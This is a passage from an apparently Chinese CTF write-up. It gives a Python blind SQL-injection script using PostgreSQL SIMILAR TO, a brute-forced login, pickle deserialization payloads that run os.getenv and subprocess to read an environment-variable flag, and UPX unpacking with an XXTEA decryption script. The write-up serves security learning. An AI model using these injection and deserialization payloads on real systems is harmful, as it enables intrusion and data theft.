TO</code>是PostgreSQL特有的模糊匹配操作符，其模式语法结合了<code>LIKE</code>的通配符（<code>%</code>、<code>_</code>）和正则表达式的元字符（如<code>|</code>、<code>()</code>、<code>[]</code>）。<a href="https://blog.csdn.net/qq_32838955/article/details/105466577?spm=1001.2101.3001.6650.4&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-4-105466577-blog-133937030.235%5Ev43%5Epc_blog_bottom_relevance_base5&utm_relevant_index=9">Postgresql学习笔记之——模糊匹配LIKE、SIMILAR TO和POSIX正则表达式_sql similar to-CSDN博客</a></p><p>SQL通配符的应用<a href="https://www.runoob.com/sql/sql-wildcards.html">https://www.runoob.com/sql/sql-wildcards.html</a></p><p>利用脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://101.35.218.130:32887/submit&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;_&quot;</span></span><br><span class="line">words = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;- &quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#探测flag长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">    flag = <span class="string">&quot;_&quot;</span> * i</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;1&#x27; or name similar to &#x27;<span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;恭喜你&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        last_found_count=i</span><br><span class="line"></span><br><span class="line"><span class="comment">#探测flag</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,last_found_count+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> words:</span><br><span class="line">        res = requests.post(url,data=<span class="string">&quot;username=1&#x27; or name SIMILAR TO &#x27;&quot;</span> + (payload * (i - <span class="number">1</span>)) + j + (payload * (last_found_count - i)),headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;恭喜你&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>运行结果获得flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjI0NmFjODZmZTA3ZTk2M2Q1ODNiYThhMjljNzg1MzhfYlJCdEQ3OTFDUm9NNU8zYzJqQTBHbHlQS1JVeXdvRGxfVG9rZW46UFF6U2JuNHRXb0ZWU0N4U0pJNmNCQ3ZTbnRmXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;45e30069-07f2-4026-b581-32058e8503fa&#125;</span><br></pre></td></tr></table></figure><h2 id="Py"><a href="#Py" class="headerlink" title="Py"></a>Py</h2><p>先看一下源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, render_template, session</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#该文件位于/app/app.py</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">24</span>)</span><br><span class="line">FLAG = os.environ.get(<span class="string">&#x27;GZCTF_FLAG&#x27;</span>, <span class="string">&#x27;CTF&#123;test_flag&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;猜下密码&#x27;</span>:</span><br><span class="line">            session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;Invalid!&quot;); location.href=&quot;/login&quot;;&lt;/script&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        data = request.form.get(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = pickle.loads(<span class="built_in">bytes</span>.fromhex(data))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;Data processed: <span class="subst">&#123;<span class="built_in">str</span>(result)&#125;</span>&#x27;</span>  <span class="comment"># 显示反序列化结果</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>登陆需要密码，可以尝试以下Burp Suite爆破，我们有字典</p><p>先添加payload</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODU5NTAwNGMxNWNmODVjODllMjIwN2FhNWJjYWE4OGRfV0lhM20wZW9YemdOaW9UWjlkZnJkMThBREJFQmZZemtfVG9rZW46WFE1SGJOZTNkb0NManB4MlBJTGNYZFZUbmZnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTUyYTIxODE5ZmUzODdjMjRmMTUzYmVhMTIzNjE0ZTZfOEgzRXZaOGZybmpycUJtNkUwNXNSUFlsa09UbGRXT0RfVG9rZW46VGI3bmJJcmQ2b2w5M0F4N0ZXR2NJOWZhbm5mXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTVmOTlkYzMyMGZmZjBiNWQ2NjQ4NjM3MmI0NjZjYzhfTjVrektjZEJGcXM1VnB6YWFVdHdwMTdMdjh0YXFveGRfVG9rZW46VDI2Y2JGTjhDb0VNNDR4ZW9uWWNPeWZJblliXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>得到密码为admin123</p><p>输入后得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQxMGRmNDJjN2U5MTA0ZmEzN2JjYTExYWFjNzU2NzRfdThMbzVhQW4xNW1WREZoZjduRVNuSjVGUWdDa2hkMk1fVG9rZW46Q1RqMGJiVzl5b2x1alp4c0p1Z2NDNThQbktiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWQyZGU5NGE2ZjI4ZWI4MWY0NjNiZWFmMjE0NjQxZTNfcnpCR0ZmMUdmcHFvWnAyMjZsYWNja1c3SnZqVHVVR3FfVG9rZW46UmFhbWIxZUIwb3ZCbm94RWQ3TGNqMFR5blhiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>看源码中，与pickle反序列化</p><p>我们可以通过构造恶意的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 读取环境变量并返回</span></span><br><span class="line">        <span class="keyword">return</span> (os.getenv, (<span class="string">&#x27;GZCTF_FLAG&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit()).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>这里也可以利用<code>subprocess</code>命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入必要的模块</span></span><br><span class="line"><span class="keyword">import</span> pickle    <span class="comment"># Python对象序列化模块（危险：反序列化时可执行任意代码）</span></span><br><span class="line"><span class="keyword">import</span> subprocess <span class="comment"># 用于执行系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义一个恶意类，利用pickle反序列化时自动调用的__reduce__方法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        当对象被pickle反序列化时，此方法会被调用</span></span><br><span class="line"><span class="string">        返回一个元组：(可调用对象, 参数元组)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 返回subprocess.check_output函数和它的参数</span></span><br><span class="line">        <span class="comment"># 参数是一个命令列表：[&quot;printenv&quot;, &quot;GZCTF_FLAG&quot;]</span></span><br><span class="line">        <span class="comment"># 这个命令会打印环境变量GZCTF_FLAG的值</span></span><br><span class="line">        <span class="keyword">return</span> (subprocess.check_output, ([<span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;GZCTF_FLAG&quot;</span>],))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成恶意payload</span></span><br><span class="line"><span class="comment"># 1. 创建Exploit对象</span></span><br><span class="line"><span class="comment"># 2. pickle.dumps将其序列化为字节流</span></span><br><span class="line"><span class="comment"># 3. .hex()将字节流转换为十六进制字符串（便于传输或存储）</span></span><br><span class="line">payload = pickle.dumps(Exploit()).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出payload（十六进制形式）</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>依旧可以实现</p><p>得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzA5YzM4OTM4YWFmNjVmMWVjMDM0ZDYzNDNmZWY4ZWJfRFd2dklIZ2xuZThuT0NKYUtzMlN0Vk5BeVRyUm93YVZfVG9rZW46S1BhSmJGTDd3b0o5Qll4UGc3Z2NFazBXbk9kXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80049522000000000000008c026f73948c06676574656e769493948c0a475a4354465f464c414794859452942e</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzE3NTFjZDkxZWIxMjZjODNlOGQyY2E2ZDFjZmJkODNfUmZrd25iSjZ5QXluWW40ZEU1TEs0RWxSYUw5YVUwZm1fVG9rZW46S0FiaGJ5MEx0b0xFaTh4UUo2MGNDa0NnblJnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>获得flag<code>QLNU&#123;a1fa2161-e736-4f91-9a50-596a0cc6f049&#125;</code></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Fly-Bird"><a href="#Fly-Bird" class="headerlink" title="Fly_Bird"></a>Fly_Bird</h2><p>先用die查一下，发现是用upx包裹的32位</p><p>所以先用upx脱壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmQzN2RlZDlmZmUxMTkyMTVhOTAwYTE2YTNlNThjM2NfS1NucmFGSDM2NmZjVUdZYlFub2phVUpLRXUyVWhpUFRfVG9rZW46QVF4VGJiZnVrb0RSTWV4b25FS2NpWHJxbkpiXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDVhMjI5ZTgxOWExM2U2YmMxZGIzZTg4ODFjZWYyNDVfdndWN2NQRFZWam5KcVljYmQ2ZW15dzNKSXhOdk1LejdfVG9rZW46T0Y4dGJCcTVHb3Rpakh4dERLeGNZUDJkbkVjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>这样就脱壳完成了，</p><p>再将其拖进ida，就能找到flag</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzE4OGUzYTM3NzIyMjliNmM4ZTc1NGRkZGY3MTI5NzJfZFk3bDdCTGg1T3FLdXI1VFh5akk4QmhRNUpDemRuRzNfVG9rZW46WVk5Q2JWdUgwb1RxNGx4bFRpTmNYY1E3bkJlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;no_pain_no_gains&#125;</span><br></pre></td></tr></table></figure><h2 id="茶（promax版）"><a href="#茶（promax版）" class="headerlink" title="茶（promax版）"></a>茶（promax版）</h2><p>解压附件后是一个exe的格式文件，用die打开后发现有一处被魔改的upx</p><p>壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTBmZGM2ZGU1NzQ1ZjFkMWE5MjNiMzFmMDkzZTRjNmVfY0xIN1prS3pnTE50NENNQ2NxTjdCNnBueHBjV2FJdUdfVG9rZW46Q1hWUmJ1Q3Jrb3U5SXh4b2Ryc2NrZUE4bm9mXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>接下来用010打开，进行修改</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NzNhZThiYjY5MjlhMjQxNThkNGMyMmE3YzQyMGExODlfTTRkS3FoM1diVnhYNFp1U29nSWJ1c2wycXgyc0VkYzhfVG9rZW46TG1iWWJwOVpsbzBiVXF4NFZ3Y2NoUURJbmpWXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YTllZmZiMjAzNGFiZWZmYjY0MTc2ZTJlMTc1NDMxZGVfUUgyaGxnMjlicDZPemY3QW93MWRJUW9YTFpsZmFQSlRfVG9rZW46Q205NWJZRWIzb21Ddm54bkdKS2NTdGZablhjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>保存后重新用die打开</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjZmYjQxZTczYzQ3MzM0NDk3ODlhY2NhMTZhZTUxOWRfQTI5VTBrSzNwQWo0UXpLQ3EyV3BGR1EyZWQ1NDlrMWdfVG9rZW46VHd6NGJ6NzI1b0NUc0Z4Zkg1RWMyWDdpbjVlXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>一个普通的upx壳，进行脱壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWExZTg1ZmQ1ZmIwZTNjOGIwNTQ2MTEwNWZjMzNjZTdfY0dWcjlRSXFLdGlsa1JCclNtcWlOeWRrQzlwNVg1anBfVG9rZW46UFI3QmI5ZURVb0N1YUx4STBlY2NBakplbktkXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>这样就脱壳成功了，接下来我们就可以把它放进ida中进行分析</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTcyYzE2YmI2OThjMjE2ZWE1YjQxODQ5OTJmMGRkZDdfSkxXR0RqNmlodHAyb2YwZVhTeU5uWlViWlZPc3lTT1hfVG9rZW46SDkwMmJlYlFlbzlNRE14OExEbmNrZVMxbmdjXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>查看unk_405020的输入内容</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjViMWFlOWQ2Mzc0NDljMWU0MTRmMTY0M2IwNzU4OTZfSHFIWnBLSEZHcjFPdUs2V0FPT05hNlFKdG9KRzZOWnNfVG9rZW46SmFLOWIyWE1IbzE1VEh4R1lmT2NBY0p5blRnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDA4YjdjYTRhNTgyMzM2YjFiMDk3YmVkMWU1MDkxMDRfUWg3YkRzc0FNM2pGdVRYME9xczU5c3JORjExOHlsUmtfVG9rZW46UFRsSWJFbDRHb2NUdkx4ZjZzeWNkSmRFbkVnXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><p>看enc加密函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWZhNTM4MjMwNGFjZTY2MzQwYzJlZWFiNjdiOTUzZTVfMDVTRlRDSFJta0JOSTltWUx1OHZlTmZqNmxXV2JsTWtfVG9rZW46SEpheGJJTmpFbzR3SEx4cGhaU2NYb0M2bmRSXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><ul><li>代码中 <code>sum -= 1640531527</code>：<ul><li><code>1640531527</code> 的十六进制是 <code>0x61C88647</code>，它是 <code>0x9E3779B9</code> 的补码表示（即 <code>-0x61C88647 = 0x9E3779B9</code>）。</li><li>这是 <strong>XXTEA&#x2F;TEA家族算法</strong> 的标志性常量。</li></ul></li></ul><p>利用脚本解决这个问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> delta 0x9e3779b9</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">37</span>] = &#123;<span class="number">0x76D42BE1</span>, <span class="number">0xD9DF03C4</span>, <span class="number">0x0BD0A181</span>, <span class="number">0xF10201C0</span>, <span class="number">0xE4592862</span>, <span class="number">0xCA7A6980</span>, <span class="number">0x042150A6</span>, <span class="number">0x2BE23AF3</span>, <span class="number">0x356E5E55</span>, <span class="number">0xC2337C76</span>, <span class="number">0xB7313BD7</span>, <span class="number">0x5B2E1195</span>, <span class="number">0xF59BE5C7</span>, <span class="number">0xD1FE3936</span>, <span class="number">0xBAD4593E</span>, <span class="number">0xC8776223</span>, <span class="number">0xA6ED7222</span>, <span class="number">0x811C4F11</span>, <span class="number">0x4FAD07DC</span>, <span class="number">0xD36AA578</span>, <span class="number">0x0230540B</span>, <span class="number">0xF89E6C42</span>, <span class="number">0x6D27DD7D</span>, <span class="number">0xECF5B7C3</span>, <span class="number">0xA9346EEC</span>, <span class="number">0xC81EF864</span>, <span class="number">0xAE305136</span>, <span class="number">0xB0DCD19A</span>, <span class="number">0x9149D1C7</span>, <span class="number">0xA593BD5F</span>, <span class="number">0x0458FCCA</span>, <span class="number">0x5A5BDBAF</span>, <span class="number">0x1C1C2221</span>, <span class="number">0x87DFA0FF</span>, <span class="number">0x4753CF52</span>, <span class="number">0x5D696B28</span>, <span class="number">0x422A7BB4</span>&#125;;</span><br><span class="line">    </span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">37</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    sum = rounds*delta;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">        e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p<span class="number">-1</span>];</span><br><span class="line">            v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">            y = v[p];</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        sum = sum-delta;</span><br><span class="line">     &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;v[i]<span class="number">+0</span>),*((<span class="type">char</span>*)&amp;v[i]<span class="number">+1</span>),*((<span class="type">char</span>*)&amp;v[i]<span class="number">+2</span>),*((<span class="type">char</span>*)&amp;v[i]<span class="number">+3</span>));</span><br><span class="line">        <span class="comment">//printf(&quot;%c%c%c%c&quot;,*((char*)&amp;v[i]+3),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+0));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA0NmRmNTQ3YzNhMzliYzcwMmYzZmRjOGZlYTVkYWJfbHhrOHVpNUVpSFdQTnBGQVc1QjIwSHJPdEpkM3B1cU1fVG9rZW46WHI3V2JwSkRub204MDF4S0puMGNxWXFRbnRoXzE3NDU4NDE1NTU6MTc0NTg0NTE1NV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;^_^yoU_MuST_1iK3_Th3_t34_pR0m4x&#125;</span><br></pre></td></tr></table></figure><h2 id="deepsleep"><a href="#deepsleep" class="headerlink" title="deepsleep"></a>deepsleep</h2><p>先拖进die中进行查看，没有加壳</p><p><img 